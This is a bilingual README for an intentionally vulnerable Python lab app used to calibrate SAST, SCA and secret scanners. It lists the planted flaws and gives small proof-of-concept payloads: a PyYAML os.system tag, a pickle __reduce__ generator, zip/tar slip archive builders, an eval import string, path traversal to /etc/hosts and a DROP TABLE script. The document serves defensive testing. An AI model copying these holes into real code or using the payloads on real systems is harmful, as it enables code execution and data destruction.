# README — py-insecure-app (FR/EN)

> **⚠️ Usage labo uniquement.** Projet intentionnellement vulnérable pour exercices SAST/SCA/Secret-Scanning. Ne pas déployer ni exécuter en production.

---

## FR — Présentation rapide

Application Python minimaliste regroupant **failles de code** (CWE) et **dépendances vulnérables** pour déclencher des alertes dans Semgrep, Snyk Code/Open Source, Checkmarx, SonarQube, JFrog Xray, etc.

**Points clés**

* SAST : SQLi (CWE‑89), RCE via `eval`/`os.system` (CWE‑78/94), désérialisation non sûre (CWE‑502), TLS désactivé (CWE‑295), Zip/Tar Slip, secrets codés en dur (CWE‑798), permissions laxistes (CWE‑732), PRNG faible (CWE‑338), MD5 (CWE‑327), *path traversal* (CWE‑22), `assert` pour l’auth (CWE‑617), import dynamique non contrôlé.
* SCA : versions vulnérables **PyYAML 5.3**, **requests 2.19.1**, **urllib3 1.24.1** dans `requirements.txt`.

### Prérequis

* Python 3.10+
* Accès internet (facultatif) pour démontrer `verify=False`

### Installation

```bash
cd py-insecure-app
python -m venv .venv && . .venv/bin/activate
pip install -r requirements.txt
```

### Exécution rapide

```bash
python app.py --initdb
python app.py --login admin admin
python app.py --cmd "whoami"
python app.py --hash password
python app.py --url https://expired.badssl.com
python app.py --read ../../etc/hosts
python app.py --tmp
python app.py --eval "__import__('os').system('echo PWNED')"
python app.py --untar samples/evil.tar
python app.py --unzip samples/evil.zip
python app.py --yaml samples/evil.yaml
python app.py --pickle samples/evil.pkl
python app.py --ssl https://example.com
python app.py --assert alice admin
python app.py --dimport os
python app.py --sqlscript "DROP TABLE IF EXISTS users; CREATE TABLE pwn(x);"
python app.py --xml samples/sample.xml
```

### Générer les fichiers PoC (calibrage des cas)

Créez le dossier `samples/` et copiez/collez :

**`samples/evil.yaml`** (PyYAML <5.4 — exécution à l’import)

```yaml
!!python/object/apply:os.system ["echo YAML_RCE"]
```

**`samples/make_evil_pickle.py`** — génère `evil.pkl` (désérialisation)

```python
import pickle, os
class E:
  def __reduce__(self):
    return (os.system, ("echo PICKLE_RCE",))
open('samples/evil.pkl','wb').write(pickle.dumps(E()))
```

**`samples/make_zip_tar.py`** — crée Zip/Tar Slip

```python
import zipfile, tarfile, os
os.makedirs('samples', exist_ok=True)
with zipfile.ZipFile('samples/evil.zip','w') as z:
  z.writestr('../../../../tmp/ZIP_SLIP.txt','owned')
with tarfile.open('samples/evil.tar','w') as t:
  import io
  data = io.BytesIO(b'owned')
  info = tarfile.TarInfo(name='../../../../tmp/TAR_SLIP.txt'); info.size=len(b'owned')
  t.addfile(info, data)
open('samples/sample.xml','w').write('<root><x>1</x></root>')
```

> **Astuce SAST** : laissez `HARDCODED_SECRET`, `API_TOKEN` et `DEFAULT_KEY` dans le code pour déclencher les détecteurs de secrets. Ne remplacez pas `verify=False` ni `tempfile.mktemp`.

### Scan SAST/SCA — commandes conseillées

```bash
# Semgrep (rapide)
semgrep --config p/ci --error py-insecure-app

# Snyk Code + Open Source (SAST+SCA)
snyk code test py-insecure-app
snyk test --file=py-insecure-app/requirements.txt

# JFrog Xray (SCA)
cd py-insecure-app && jf audit --pip --requirements-file=requirements.txt
```

---

## EN — Quick overview

Deliberately vulnerable Python app to light up SAST/SCA/Secrets findings.

**Highlights**

* SAST: SQLi, command/RCE via `eval` & `os.system`, unsafe deserialization, TLS disabled, Zip/Tar Slip, hardcoded secrets, lax perms, weak PRNG, MD5, path traversal, `assert` for auth, uncontrolled dynamic import.
* SCA: vulnerable `PyYAML 5.3`, `requests 2.19.1`, `urllib3 1.24.1`.

**Install / Run / PoCs** → see FR section above (same commands).

**CI note (TeamCity)**: run steps as simple command-line runners; prefer PowerShell on Windows agents.

